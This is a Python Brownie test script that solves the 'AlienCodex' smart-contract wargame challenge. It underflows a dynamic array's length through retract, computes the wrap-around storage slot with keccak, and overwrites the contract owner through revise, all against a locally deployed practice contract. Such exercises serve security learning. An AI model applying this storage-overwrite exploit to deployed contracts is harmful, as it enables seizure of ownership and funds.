from brownie import accounts, convert, interface, web3, AlienCodex
from eth_utils import keccak

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    alien = AlienCodex.deploy({'from': owner})
    assert alien.owner() == owner
    target = interface.AlienCodexInterface(alien.address)
    target.make_contact({'from': hacker})
    array_size = web3.eth.get_storage_at(target.address, 1).hex()
    assert convert.to_uint(array_size) == 0
    # First we want array to use all space
    target.retract({'from': hacker})
    array_size = web3.eth.get_storage_at(target.address, 1).hex()
    assert convert.to_uint(array_size) != 0
    # First element of our array should be located at:
    first_position = convert.to_uint(keccak(convert.to_bytes(1)))
    # 2 ** 256 max storage pointer for the dynamic array
    zero_position = 2 ** 256 - first_position
    target.revise(zero_position, hacker.address, {'from': hacker})
    assert alien.owner() == hacker


